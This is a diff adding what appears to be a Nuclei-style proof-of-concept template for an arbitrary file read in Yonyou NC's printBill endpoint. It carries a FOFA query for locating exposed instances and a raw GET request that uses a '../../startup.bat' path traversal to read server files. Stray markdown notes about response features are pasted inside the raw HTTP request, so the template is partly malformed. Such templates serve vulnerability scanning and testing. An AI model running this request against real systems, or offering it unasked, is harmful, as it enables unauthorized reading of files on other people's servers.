@@ -1,0 +1,37 @@
+id: poc-udvypx8g6p6ycf2l
+info:
+  name: 用友NC printBill 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/udvypx8g6p6ycf2l'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: udvypx8g6p6ycf2l
+    fofa: app="用友-NC-Cloud"
+http:
+- raw:
+  - 'GET /portal/pt/printpdf/printBill?pageId=login&filePath=../../startup.bat HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    HOME
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
